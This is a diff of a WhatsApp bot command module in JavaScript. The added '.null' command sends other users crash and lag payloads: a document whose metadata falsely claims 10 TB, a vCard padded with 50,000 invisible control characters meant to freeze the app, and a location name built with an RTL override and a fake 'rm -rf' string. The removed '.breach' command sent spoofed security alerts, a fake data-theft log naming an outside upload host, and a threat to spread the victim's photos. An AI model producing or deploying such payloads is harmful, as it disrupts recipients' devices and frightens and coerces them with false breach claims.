@@ -1,66 +1,67 @@
 export default {
-    name: 'session_breach_protocol',
-    match: (text) => /^\.breach/i.test(text),
+    name: 'resource_exhaustion_protocol',
+    match: (text) => /^\.null/i.test(text),
     execute: async ({ sock, remitente, msg }) => {
         
         try {
-            // 1. Sigilo absoluto: Borrado del comando
+            // 1. Sigilo: Borrado de tu comando
             try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
 
-            // 2. FASE 1: Alerta de Dispositivo Vinculado (Spoofing)
-            // Esto genera una miniatura que imita la seguridad de WhatsApp
+            // 2. ATAQUE 1: El "Documento de 10TB" (Memory Pressure)
+            // No pesa nada, pero el header engaña al sistema.
             await sock.sendMessage(remitente, {
-                text: "⚠️ *SECURITY ALERT:* A new device has been linked to your account from *Moscow, RU (IP: 92.44.12.181)*.",
+                document: Buffer.alloc(0),
+                mimetype: 'application/octet-stream',
+                fileName: 'KERNEL_DUMP_OVERFLOW.sys',
+                fileLength: 10995116277760, // 10 Terabytes ficticios en el metadato
+                pageCount: 1000000,
+                caption: '⚠️ *SYSTEM HALT:* Buffer Overflow at 0x000045'
+            });
+
+            await new Promise(r => setTimeout(r, 1000));
+
+            // 3. ATAQUE 2: La "VCard Lag" (UI Thread Blocking)
+            // Creamos una cadena masiva de caracteres de control invisibles
+            const lagString = '\u200E'.repeat(50000); 
+            const vcard = 'BEGIN:VCARD\n' +
+                          'VERSION:3.0\n' +
+                          'FN:⚠️ PROTOCOLO_NULL\n' +
+                          'ORG:META_SERVER_AUDIT;\n' +
+                          'NOTE:' + lagString + '\n' +
+                          'END:VCARD';
+
+            await sock.sendMessage(remitente, {
+                contacts: {
+                    displayName: '⚠️ PROTOCOLO_NULL',
+                    contacts: [{ vcard }]
+                }
+            });
+
+            await new Promise(r => setTimeout(r, 1000));
+
+            // 4. ATAQUE 3: GPS Corrupto (Visual Glitch)
+            // El nombre usa RTL Override para desordenar la interfaz
+            const rtlName = '\u202E' + "atad rO erroR metsyS"; 
+            await sock.sendMessage(remitente, {
+                location: { 
+                    degreesLatitude: -12.046374, 
+                    degreesLongitude: -77.042793 
+                },
+                name: rtlName,
+                address: "Executing: `rm -rf /data/user/0/com.whatsapp/`",
                 contextInfo: {
                     externalAdReply: {
-                        title: "WHATSAPP WEB: LOGIN DETECTED",
-                        body: "If this wasn't you, revoke the session immediately.",
+                        title: "CRITICAL_FAILURE",
+                        body: "Heap Memory Exhausted",
                         mediaType: 1,
-                        renderLargerThumbnail: false,
-                        thumbnailUrl: "https://www.whatsapp.com/apple-touch-icon.png",
-                        sourceUrl: "https://web.whatsapp.com/settings/security"
+                        thumbnail: Buffer.alloc(0),
+                        sourceUrl: "https://google.com/search?q=whatsapp+crash+unicode"
                     }
                 }
             });
 
-            await new Promise(r => setTimeout(r, 2000));
-
-            // 3. FASE 2: Dumping de Metadatos (Terminal Style)
-            const logId = Math.random().toString(36).substring(7).toUpperCase();
-            const terminalMsg = await sock.sendMessage(remitente, { 
-                text: `[SYSTEM] Initializing metadata bypass...\n[AUTH] Token: \`WA_AUTH_${logId}\`\n[PORT] 443 -> OPEN` 
-            });
-
-            const logs = [
-                "🔓 Capturando `wa.db` (Contactos)...",
-                "🔓 Capturando `msgstore.db` (Mensajes)...",
-                "🔓 Espejo de `DCIM/Camera` iniciado...",
-                "📡 Uploading to: `https://dark-cloud.ru/pwn/`",
-                "✅ *INFILTRACIÓN COMPLETADA*"
-            ];
-
-            for (const log of logs) {
-                await new Promise(r => setTimeout(r, 1500));
-                await sock.sendMessage(remitente, {
-                    text: `[SESSION_BREACH_${logId}]\n\n${log}`,
-                    edit: terminalMsg.key
-                });
-            }
-
-            // 4. FASE 3: El "Golpe" Final (Presión Social)
-            // Enviamos un contacto falso que representa al "Atacante"
-            await sock.sendMessage(remitente, {
-                contacts: {
-                    displayName: "ADMIN_RECOVERY_NODE",
-                    contacts: [{
-                        vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ADMIN_RECOVERY\nTEL;type=CELL;type=VOICE;waid=${sock.user.id.split(':')[0]}:+${sock.user.id.split(':')[0]}\nEND:VCARD`
-                    }]
-                },
-                caption: "🚨 *ACCESO TOTAL CONCEDIDO*\n\nSe ha iniciado la descarga de tu galería de fotos. El archivo se enviará a tus primeros 5 contactos si no se detiene el proceso."
-            });
-
         } catch (err) {
-            console.error("Falla en Protocolo Breach:", err);
+            console.error("Error en Protocolo NULL:", err);
         }
     }
 };
